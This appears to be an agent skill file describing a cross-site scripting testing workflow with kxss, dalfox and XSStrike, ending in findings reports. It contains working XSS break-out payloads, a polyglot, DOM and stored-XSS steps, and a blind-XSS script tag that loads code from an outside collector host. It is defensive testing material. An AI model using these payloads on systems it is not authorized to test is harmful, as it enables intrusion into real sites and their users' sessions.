---
name: xss-testing
description: Detect, confirm, and produce PoCs for cross-site scripting (reflected, stored, DOM-based, blind) using kxss/Gxss reflection discovery, dalfox pipeline scanning, XSStrike context analysis, and manual break-out payloads; use on any parameter, header, or field whose value appears in a response or is consumed by client-side JavaScript (WSTG-INPV-01/02, WSTG-CLNT-01, CWE-79).
license: Apache-2.0
metadata:
  author: Section9Labs
  wstg: "WSTG-INPV-01, WSTG-INPV-02, WSTG-CLNT-01"
  cwe: "CWE-79"
---

# XSS Testing — Reflected, Stored, DOM, Blind

Goal: parameterized/reflecting endpoints in → confirmed XSS with a working PoC URL/request out.
Every confirmed injection becomes a rupu finding carrying the exact HTTP exchange; every
tested route is marked as an asset. rupu wiring details: `references/rupu.md`.

## Workflow overview

```
URL corpus (gau/katana/waybackurls/crawl)
   │
   ├─► kxss / Gxss ──► reflecting params + surviving special chars
   │                        │
   ├────────────────────────┴─► dalfox scan (pipeline, JSON out) ─► scripts/parse_dalfox.py
   │                                                                 ├─ work-units JSON array
   ├─► XSStrike (context/filter/DOM analysis, manual)                ├─ findings.report payloads
   │                                                                 └─ assets.mark payloads
   └─► manual context confirmation + stored/blind workflows
```

## 1. Build the URL corpus

Collect every URL with query parameters, every form, every JSON/API endpoint that echoes
input. Sources: `gau example.com`, `waybackurls example.com`, `katana -u https://example.com
-d 3 -jc`, a Burp/ZAP crawl export, or the output of an upstream crawling skill. Deduplicate
by parameter signature so you test each (path, param-set) once:

```sh
gau example.com | grep '=' | sort -u > urls.txt
```

Mark each discovered site/route via `assets.mark` (kind `web:site` / `web:route`, depth
`mapped` or `crawled`) — shapes in `references/rupu.md`, and use the `coverage-assets`
skill for the recording conventions.

## 2. Find reflections first — kxss / Gxss

Before spending scan time, learn which parameters reflect and which special characters
survive filtering. That tells you where a payload can break out and in what context.

```sh
cat urls.txt | kxss
# Output per hit:  URL: https://example.com/s?q=... Param: q Unfiltered: [" ' < >]
```

Read `Unfiltered:`:
- `< >` survive → tag injection is possible (`<script>`, `<img onerror>`).
- `"` or `'` survive → attribute or JS-string break-out.
- Nothing survives → still check DOM sinks and encoding tricks; don't discard yet.

Gxss alternative (`cat urls.txt | Gxss -c 50 -p Rand0m -o reflected.txt`) only tells you
*that* a param reflects, not which chars survive — prefer kxss. Gxss is deprecated upstream
in favor of dalfox's own discovery: `dalfox file urls.txt --skip-xss-scanning` emits
reflected parameters without payload testing. Full usage and output parsing:
`references/xsstrike-and-reflection.md`.

Handoff: feed the reflecting URLs (or the whole corpus if small) to dalfox. Normalize the
kxss hits into a work-units array (one unit per reflecting URL+param) with the
`work-units` skill if you want to fan out dalfox runs across agents.

## 3. dalfox — pipeline-grade scanning

Modern dalfox requires the `scan` subcommand (`url`/`file`/`pipe` are hidden aliases).
Always capture machine-readable output. Full flag reference: `references/dalfox.md`.

Single target, specific parameter:
```sh
dalfox scan "https://example.com/search?q=test" -p q -o dalfox.json -f json
```

Pipe mode over the corpus:
```sh
cat urls.txt | dalfox scan -o dalfox.jsonl -f jsonl -S
```

Key capabilities to use deliberately:
- Parameter mining: on by default (GF-patterns dict + DOM mining). Widen with
  `-W wordlist.txt` (`--mining-dict-word`); disable with `--skip-mining-dict` /
  `--skip-mining-dom` when you already know the params and want speed.
- Request shaping: `-X POST -d 'q=test&submit=1'`, `-H "Authorization: Bearer ..."`,
  `--cookies "session=abc123"` (note the **s** — `--cookie` is wrong).
- Blind XSS: `-b https://<id>.oast.pro` appends blind payloads pointing at your collector
  (interactsh or XSS Hunter). Start `interactsh-client -json -o oast.jsonl` first and use
  the issued domain.
- Stored XSS: `--sxss --sxss-url "https://example.com/profile"` — inject into the scanned
  request, verify execution on the render URL.
- Hardened targets: `--waf-evasion`, `--deep-scan`, `--custom-payload payloads.txt`.

Reading output: each result object has `type` (`V` = verified in headless browser,
`R` = reflected payload, `G` = grep/pattern), `inject_type` (context: `inHTML`, `inATTR`,
`inJS`, `inPATTERN`, DOM variants), `data` (the exact PoC URL), `param`, `payload`,
`evidence` (the reflecting response line), `cwe`, `severity`, `message_str`.
`type:V` is browser-confirmed execution; `type:R` means the payload reflected unencoded —
verify it manually before reporting as exploited.

**Parse/handoff (required):** run the parser —
```sh
python3 scripts/parse_dalfox.py dalfox.json \
  --out xss-normalized.json \
  --work-units xss-units.json \
  --findings xss-findings.json \
  --assets xss-assets.json
```
It dedupes, normalizes each PoC to `{type, url, param, payload, evidence, context, cwe}`,
emits a work-units array (first char `[`; one unit per injection point — hand it to the
`work-units` skill / a `for_each:`), ready-to-send `findings.report` payloads, and
`assets.mark` payloads (`web:route`, depth `tested` for `R`/`G`, `exploited` for `V`).
Exact JSON shapes: `references/rupu.md`.

## 4. XSStrike — context and filter analysis

XSStrike is the intelligence tool: it fingerprints the reflection context, probes the
filter/WAF character by character, scores payload efficiency, and analyzes DOM sources
and sinks. It has **no machine-readable output** — use it to understand *why* a payload
works or fails, then hand the confirmed vector to dalfox or write the finding manually.

```sh
python3 xsstrike.py -u "https://example.com/search?q=query"
python3 xsstrike.py -u "https://example.com/login" --data "user=q&pass=x"   # POST
python3 xsstrike.py -u "https://example.com/" --crawl -l 3                  # crawl depth 3
python3 xsstrike.py -u "https://example.com/" --crawl --blind              # blind during crawl
python3 xsstrike.py -u "https://example.com/s?q=q" --fuzzer                # filter probing (slow)
```

Read the output for: `Reflections found`, the context line (`Context: HTML/attribute/script`),
`Efficiency`/`Confidence` scores per payload (efficiency 100 = exact reflection), and the
`Potentially vulnerable objects` DOM report (highlighted sources/sinks). `--skip` suppresses
the POC-continuation prompt for unattended runs. Details and output interpretation:
`references/xsstrike-and-reflection.md`.

**Parse/handoff (required):** XSStrike results are confirmed manually (step 5), then either
reported directly via the `finding-report` skill / `findings.report`, or re-run through
dalfox (`dalfox scan <url> -p <param> -f json`) to get pipeline evidence for
`scripts/parse_dalfox.py`. Mark analyzed routes `web:route` depth `tested`.

## 5. Context analysis and manual confirmation

Identify the reflection context, pick the break-out, verify execution in a browser or
headless (`type:V` in dalfox already is browser-verified). Per-context break-outs, full
payload lists, polyglots, and CSP bypass tactics: `references/contexts-and-payloads.md`.

Quick map:

| Context | Reflection looks like | Break-out |
|---|---|---|
| HTML body | `<p>INPUT</p>` | `<img src=x onerror=alert(1)>` |
| Attribute (quoted) | `<input value="INPUT">` | `" autofocus onfocus=alert(1) x="` |
| Attribute (unquoted) | `<input value=INPUT>` | `x onmouseover=alert(1)` |
| JS string | `var q='INPUT';` | `';alert(1);//` or `</script><script>alert(1)</script>` |
| URL attribute | `<a href="INPUT">` | `javascript:alert(1)` |
| CSS | `<style>...INPUT...</style>` | `</style><script>alert(1)</script>` |

Universal probe polyglot (fires in many contexts, good first manual shot):
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

DOM XSS: trace sources (`location.hash`, `location.search`, `document.referrer`,
`window.name`, `postMessage` data, `localStorage`) into sinks (`innerHTML`, `outerHTML`,
`document.write(ln)`, `eval`, `setTimeout`/`setInterval` string args, `Function`,
`element.src`, `location =`, jQuery `.html()`/`$()`). Test with `#` payloads
(`https://example.com/page#<img src=x onerror=alert(1)>`) since fragments never reach the
server. XSStrike's DOM report and browser devtools breakpoints on sinks are the workflow.

Stored XSS: inject into every persisted field (profile, comment, filename, User-Agent,
support ticket) with a unique marker per field (`xss-<field>-<rand>`); then crawl all render
surfaces — including *other* users' views and admin panels — to find where each marker lands;
then re-inject the context-correct payload and confirm execution at the render URL.
dalfox automates the pair with `--sxss --sxss-url`.

Blind XSS: when you can't see the render surface (admin backends, log viewers, ticket
queues). Start `interactsh-client -json -o oast.jsonl`, inject
`"><script src=https://<id>.oast.pro></script>` (or dalfox `-b`) into feedback forms,
headers, usernames; a later HTTP interaction in `oast.jsonl` confirms execution and the
interaction's source IP/User-Agent tells you *whose* browser fired. Correlate the
interaction subdomain back to the injection point (use unique subdomain prefixes per field).

Adjacent class — prototype pollution (pointer only): if query/body keys reach a recursive
merge, `?__proto__[polluted]=1` or JSON `{"__proto__":{"polluted":1}}` pollutes
`Object.prototype`; check `window.polluted` in the console, then hunt script gadgets that
turn pollution into XSS. Tools: ppmap, pp-finder, DOM Invader. Brief methodology in
`references/contexts-and-payloads.md`; report as CWE-1321.

## 6. Report

For every confirmed XSS, call `findings.report`: scope `endpoint`, `target_ref` = the PoC
URL, severity high for reflected/DOM/stored with execution (medium if execution requires
unusual preconditions), `evidence.rationale` naming the parameter, payload, reflection
context, and the request/response exchange showing the unencoded reflection, classified
WSTG-INPV-01 (reflected), WSTG-INPV-02 (stored), WSTG-CLNT-01 (DOM) and CWE-79. The
`parse_dalfox.py --findings` output is pre-shaped for this; polish rationale/severity, then
submit via the `finding-report` skill. Mark the route `web:route` depth `exploited`.

## References

- `references/dalfox.md` — full dalfox flag reference, output schema, recipes.
- `references/xsstrike-and-reflection.md` — XSStrike deep-dive, kxss/Gxss usage and parsing.
- `references/contexts-and-payloads.md` — per-context break-outs, DOM sources/sinks,
  stored/blind workflows, polyglots, CSP bypass, prototype pollution.
- `references/rupu.md` — exact work-unit / assets.mark / findings.report JSON shapes.
